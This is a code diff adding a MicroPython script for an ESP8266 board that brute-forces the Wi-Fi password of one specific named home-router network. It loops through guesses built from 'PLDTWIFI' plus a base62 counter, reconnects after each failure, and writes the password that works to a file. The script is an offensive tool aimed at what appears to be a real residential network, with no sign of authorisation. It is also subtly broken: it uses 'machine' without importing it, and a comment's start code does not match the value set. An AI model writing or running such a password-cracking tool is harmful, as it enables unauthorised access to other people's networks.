@@ -1,0 +1,105 @@
+import network
+import time
+
+SSID_TARGET = "PLDTHOMEFIBRacNDs"
+PASSWORDS = ["paawordwifi1", "password23"]
+# Set up the onboard LED (GPIO2 for ESP8266)
+led = machine.Pin(2, machine.Pin.OUT)
+# Initialize Wi-Fi
+
+wifi = network.WLAN(network.AP_IF)
+wifi.active(0)
+
+wifi = network.WLAN(network.STA_IF)
+wifi.active(True)
+
+
+def blink_led():
+    led.value(1)  # Turn LED on
+    time.sleep(0.5)  # Wait for 0.5 seconds
+    led.value(0)  # Turn LED off
+    time.sleep(0.5)  # Wait for 0.5 seconds
+    
+# Ensure it's only in station mode, no AP mode should be started
+if wifi.active():
+    wifi.disconnect()  # Disconnect if previously connected
+def scan_and_connect():
+    i=0
+    while True:
+        print("Scanning for Wi-Fi networks...")
+        networks = wifi.scan()  # List of available networks
+        
+        found = any(SSID_TARGET in str(net[0], 'utf-8') for net in networks)
+        if not found:
+            print(f"SSID {SSID_TARGET} not found. Retrying in 5 seconds...")
+            time.sleep(10)
+            continue
+        if found:
+            
+            print(f"Found {SSID_TARGET}, attempting to connect...")
+            
+            while True:
+                
+                code = int_to_base62(num + (i * 1), length=5)
+                password="PLDTWIFI"+code
+                print(f"Trying password: {password}")
+                wifi.disconnect()  # Ensure disconnection before reconnecting
+                wifi.active(True)  # Ensure Wi-Fi is active
+                wifi.connect(SSID_TARGET, str(password))
+                
+                timeout = 12  # Wait for 10 seconds to connect
+                while not wifi.isconnected() and timeout > 0:
+                    time.sleep(1)
+                    timeout -= 1
+                    print("Connecting...")
+                    print("Status:", wifi.status())  # Print connection status for debugging
+                
+                
+                if wifi.isconnected():
+                    print("Connected successfully!")
+                    print("IP Address:", wifi.ifconfig()[0])
+                    print(f"SUCCESS password: {password}")
+                    blink_led()
+                    with open("wifi_pass.txt", "w") as file:  # Use "codes.txt" for normal Python
+                        file.write(f"Code {i+1}: {password}\n")  # Save to file
+                        time.sleep(1)  # Pause for readability
+                        print("Codes saved to 'wifi_pass.txt'.")
+                        print(f"SUCCESS password: {password}")
+                    return True
+                else:
+                    i+=1
+                    print("Failed to connect with this password.")
+        else:
+            print(f"SSID {SSID_TARGET} not found. Retrying...")
+        
+        time.sleep(5)  # Wait before retrying
+
+
+# Define the base62 character set
+BASE62 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+
+def base62_to_int(code):
+    """Convert a base62 string to an integer."""
+    num = 0
+    for char in code:
+        num = num * 62 + BASE62.index(char)
+    return num
+
+def int_to_base62(num, length=5):
+    """Convert an integer to a base62 string of fixed length."""
+    code = ""
+    for _ in range(length):
+        code = BASE62[num % 62] + code
+        num //= 62
+    return code
+
+# Start from "/z8Anm"
+start_code = "z8Anj"
+num = base62_to_int(start_code)
+
+
+
+if __name__ == "__main__":
+    scan_and_connect()
+
+
